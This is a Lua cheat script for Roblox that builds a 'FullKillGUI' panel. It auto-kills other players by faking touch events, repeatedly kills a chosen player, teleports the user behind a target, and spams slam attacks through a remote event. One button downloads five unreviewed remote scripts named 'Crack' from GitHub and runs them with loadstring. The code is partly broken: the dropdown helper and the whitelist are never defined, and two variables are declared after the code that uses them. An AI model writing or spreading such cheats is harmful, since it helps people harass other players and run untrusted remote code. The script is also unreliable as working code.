-- FULL GUI with all kill features integrated

local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local LocalPlayer = Players.LocalPlayer

-- Create main ScreenGui
local gui = Instance.new("ScreenGui")
gui.Name = "FullKillGUI"
gui.Parent = LocalPlayer:WaitForChild("PlayerGui")

-- Create main frame
local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 700, 0, 800)
frame.Position = UDim2.new(0.5, -350, 0.5, -400)
frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
frame.BorderSizePixel = 2
frame.Parent = gui

-- Make draggable
local function makeDraggable(f)
    local dragging = false
    local dragStart, startPos
    f.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = true
            dragStart = input.Position
            startPos = f.Position
            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then
                    dragging = false
                end
            end)
        end
    end)
    UserInputService.InputChanged:Connect(function(input)
        if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
            local delta = input.Position - dragStart
            f.Position = UDim2.new(
                startPos.X.Scale,
                startPos.X.Offset + delta.X,
                startPos.Y.Scale,
                startPos.Y.Offset + delta.Y
            )
        end
    end)
end
makeDraggable(frame)

local yPos = 10

local function newLabel(text)
    local lbl = Instance.new("TextLabel", frame)
    lbl.Text = text
    lbl.Size = UDim2.new(1, -20, 0, 20)
    lbl.Position = UDim2.new(0, 10, 0, yPos)
    lbl.TextColor3 = Color3.new(1, 1, 1)
    lbl.BackgroundTransparency = 1
    lbl.Font = Enum.Font.Merriweather
    lbl.TextSize = 14
    yPos = yPos + 25
    return lbl
end

local function newButton(text, callback)
    local btn = Instance.new("TextButton", frame)
    btn.Size = UDim2.new(1, -20, 0, 40)
    btn.Position = UDim2.new(0, 10, 0, yPos)
    btn.Text = text
    btn.Font = Enum.Font.Merriweather
    btn.TextSize = 14
    btn.TextColor3 = Color3.new(1, 1, 1)
    btn.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
    btn.MouseButton1Click:Connect(callback)
    yPos = yPos + 45
    return btn
end

local function newSwitch(label, callback)
    local container = Instance.new("Frame", frame)
    container.Size = UDim2.new(1, -20, 0, 30)
    container.Position = UDim2.new(0, 10, 0, yPos)
    container.BackgroundTransparency = 1
    local lbl = Instance.new("TextLabel", container)
    lbl.Text = label
    lbl.Size = UDim2.new(0.7, 0, 1, 0)
    lbl.BackgroundTransparency = 1
    lbl.TextColor3 = Color3.new(1, 1, 1)
    lbl.Font = Enum.Font.Merriweather
    lbl.TextSize = 14
    local toggleBtn = Instance.new("TextButton", container)
    toggleBtn.Size = UDim2.new(0, 20, 0, 20)
    toggleBtn.Position = UDim2.new(0.8, 0, 0.5, -10)
    toggleBtn.AnchorPoint = Vector2.new(0.5, 0.5)
    toggleBtn.BackgroundColor3 = Color3.fromRGB(150, 150, 150)
    toggleBtn.Text = ""
    local state = false
    toggleBtn.MouseButton1Click:Connect(function()
        state = not state
        toggleBtn.BackgroundColor3 = state and Color3.fromRGB(0, 255, 0) or Color3.fromRGB(150, 150, 150)
        callback(state)
    end)
    yPos = yPos + 35
    return {
        Set = function(self, val) 
            state = val
            toggleBtn.BackgroundColor3 = val and Color3.fromRGB(0, 255, 0) or Color3.fromRGB(150, 150, 150)
        end,
        Get = function(self) return state end
    }
end

-- ============================
-- Integrate your features as buttons/switches
-- ============================

-- 1. Auto Kill toggle
local autoKillSwitch = false
local autoKillSwitchObj = newSwitch("Auto Kill", function(state)
    autoKillSwitch = state
    spawn(function()
        while autoKillSwitch do
            local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
            local rightHand = character:FindFirstChild("RightHand")
            local leftHand = character:FindFirstChild("LeftHand")
            local punch = LocalPlayer.Backpack:FindFirstChild("Punch")
            if punch and not character:FindFirstChild("Punch") then
                punch.Parent = character
            end
            if rightHand and leftHand then
                for _, target in ipairs(Players:GetPlayers()) do
                    if target ~= LocalPlayer and not playerWhitelist[target.Name] then
                        local targetChar = target.Character
                        local rootPart = targetChar and targetChar:FindFirstChild("HumanoidRootPart")
                        if rootPart then
                            pcall(function()
                                firetouchinterest(rightHand, rootPart, 1)
                                firetouchinterest(leftHand, rootPart, 1)
                                firetouchinterest(rightHand, rootPart, 0)
                                firetouchinterest(leftHand, rootPart, 0)
                            end)
                        end
                    end
                end
            end
            wait(0.05)
        end
    end)
end)
local killToggleObj = autoKillSwitchObj -- to set value later if needed

-- 2. Target selection dropdown
local targetDropdown = createDropdown(frame, "Select Target", {}, function(selectedName)
    -- set target for kill
    for _, p in ipairs(Players:GetPlayers()) do
        if p.DisplayName == selectedName then
            selectedTargetName = p.Name
            break
        end
    end
end)

local targetNames = {}
local selectedTargetName = nil

-- Populate initial list
for _, p in ipairs(Players:GetPlayers()) do
    if p ~= LocalPlayer then
        targetDropdown:Add(p.DisplayName)
        table.insert(targetNames, p.Name)
    end
end

-- Update list when players join/leave
Players.PlayerAdded:Connect(function(player)
    targetDropdown:Add(player.DisplayName)
    table.insert(targetNames, player.Name)
end)
Players.PlayerRemoving:Connect(function(player)
    for i, v in ipairs(targetNames) do
        if v == player.Name then table.remove(targetNames, i) end
    end
    -- Refresh dropdown list
    targetDropdown:Clear()
    for _, p in ipairs(Players:GetPlayers()) do
        if p ~= LocalPlayer then targetDropdown:Add(p.DisplayName) end
    end
end)

-- 3. Button to start killing selected target
local killTargetActive = false
local killBtn = newButton("Start Killing", function()
    killTargetActive = not killTargetActive
    -- Run kill loop
    spawn(function()
        while killTargetActive do
            if selectedTargetName then
                local targetPlayer = Players:FindFirstChild(selectedTargetName)
                if targetPlayer and targetPlayer.Character then
                    local targetHRP = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
                    local targetHumanoid = targetPlayer.Character:FindFirstChild("Humanoid")
                    if targetHRP and targetHumanoid and targetHumanoid.Health > 0 then
                        local character = LocalPlayer.Character
                        local rightHand = character:FindFirstChild("RightHand")
                        local leftHand = character:FindFirstChild("LeftHand")
                        if rightHand and leftHand then
                            pcall(function()
                                firetouchinterest(rightHand, targetHRP, 1)
                                firetouchinterest(leftHand, targetHRP, 1)
                                firetouchinterest(rightHand, targetHRP, 0)
                                firetouchinterest(leftHand, targetHRP, 0)
                            end)
                        end
                    end
                end
            end
            wait(0.05)
        end
    end)
end)

-- 4. Follow Player dropdown
local followDropdown = createDropdown(frame, "Follow Player", {}, function(selectedName)
    for _, p in ipairs(Players:GetPlayers()) do
        if p.DisplayName == selectedName then
            followTargetName = p.Name
            following = true
        end
    end
end)
local followTargetName = nil
local following = false

-- Populate follow list
for _, p in ipairs(Players:GetPlayers()) do
    if p ~= LocalPlayer then
        followDropdown:Add(p.DisplayName)
    end
end

-- Update list when players join/leave
Players.PlayerAdded:Connect(function(p)
    followDropdown:Add(p.DisplayName)
end)
Players.PlayerRemoving:Connect(function(p)
    -- refresh list
    followDropdown:Clear()
    for _, plr in ipairs(Players:GetPlayers()) do
        if plr ~= LocalPlayer then followDropdown:Add(plr.DisplayName) end
    end
    if followTargetName == p.Name then
        followTargetName = nil
        following = false
    end
end)

-- Follow loop
spawn(function()
    while true do
        if following and followTargetName then
            local target = Players:FindFirstChild(followTargetName)
            if target and target.Character then
                local myChar = LocalPlayer.Character
                local myHRP = myChar and myChar:FindFirstChild("HumanoidRootPart")
                local targetHRP = target.Character:FindFirstChild("HumanoidRootPart")
                if myHRP and targetHRP then
                    local pos = targetHRP.CFrame * CFrame.new(0, 0, -3)
                    myHRP.CFrame = CFrame.new(pos.Position, targetHRP.Position)
                end
            end
        end
        wait(0.02)
    end
end)

-- 5. Toggle for "auto slams" (ground pound)
local autoSlamSwitch = newSwitch("Auto Slams", function(state)
    autoSlam = state
    spawn(function()
        while autoSlam do
            local player = LocalPlayer
            local groundSlam = player.Backpack:FindFirstChild("Ground Slam")
                or (player.Character and player.Character:FindFirstChild("Ground Slam"))
            if groundSlam then
                if groundSlam.Parent == player.Backpack then
                    groundSlam.Parent = player.Character
                end
                if groundSlam:FindFirstChild("attackTime") then
                    groundSlam.attackTime.Value = 0
                end
                player.muscleEvent:FireServer("slam")
                groundSlam:Activate()
            end
            wait(0.1)
        end
    end)
end)

-- 6. Button to execute external scripts
local scriptUrls = {
    "https://raw.githubusercontent.com/SadOz8/Stuffs/refs/heads/main/Crack",
    "https://raw.githubusercontent.com/SadOz8/Stuffs/refs/heads/main/Crack2",
    "https://raw.githubusercontent.com/SadOz8/Stuffs/refs/heads/main/Crack4",
    "https://raw.githubusercontent.com/SadOz8/Stuffs/refs/heads/main/Crack5",
    "https://raw.githubusercontent.com/SadOz8/Stuffs/refs/heads/main/Crack6"
}
local executeScriptsBtn = newButton("Execute Scripts", function()
    for _, url in ipairs(scriptUrls) do
        spawn(function()
            local success, response = pcall(function() return game:HttpGet(url) end)
            if success and response then
                local loadSuccess, err = pcall(function() loadstring(response)() end)
                if not loadSuccess then warn("Error executing script:", err) end
            end
        end)
    end
end)

-- 7. Change Time of Day Dropdown
local timeOptions = {
    "Morning", "Noon", "Afternoon", "Sunset", "Night", "Midnight", "Dawn", "Early Morning"
}
local timeDropdown = createDropdown(frame, "Change Time", timeOptions, function(selection)
    -- Reset lighting
    local lighting = game:GetService("Lighting")
    lighting.Brightness = 2
    lighting.FogEnd = 100000
    lighting.Ambient = Color3.fromRGB(127, 127, 127)
    if selection == "Morning" then
        lighting.ClockTime = 6
        lighting.Brightness = 2
        lighting.Ambient = Color3.fromRGB(200, 200, 255)
    elseif selection == "Noon" then
        lighting.ClockTime = 12
        lighting.Brightness = 3
        lighting.Ambient = Color3.fromRGB(255, 255, 255)
    elseif selection == "Afternoon" then
        lighting.ClockTime = 16
        lighting.Brightness = 2.5
        lighting.Ambient = Color3.fromRGB(255, 220, 180)
    elseif selection == "Sunset" then
        lighting.ClockTime = 18
        lighting.Brightness = 2
        lighting.Ambient = Color3.fromRGB(255, 150, 100)
        lighting.FogEnd = 500
    elseif selection == "Night" then
        lighting.ClockTime = 20
        lighting.Brightness = 1.5
        lighting.Ambient = Color3.fromRGB(100, 100, 150)
        lighting.FogEnd = 800
    elseif selection == "Midnight" then
        lighting.ClockTime = 0
        lighting.Brightness = 1
        lighting.Ambient = Color3.fromRGB(50, 50, 100)
        lighting.FogEnd = 400
    elseif selection == "Dawn" then
        lighting.ClockTime = 4
        lighting.Brightness = 1.8
        lighting.Ambient = Color3.fromRGB(180, 180, 220)
    elseif selection == "Early Morning" then
        lighting.ClockTime = 2
        lighting.Brightness = 1.2
        lighting.Ambient = Color3.fromRGB(100, 120, 180)
    end
end)

-- ============================
-- Final notes:
-- Use this as a template. Connect your specific functions in the button callbacks.
-- Make sure your game environment allows such scripts to run.
-- ============================

-- **You can extend this GUI further by adding more switches, buttons, or dropdowns.**
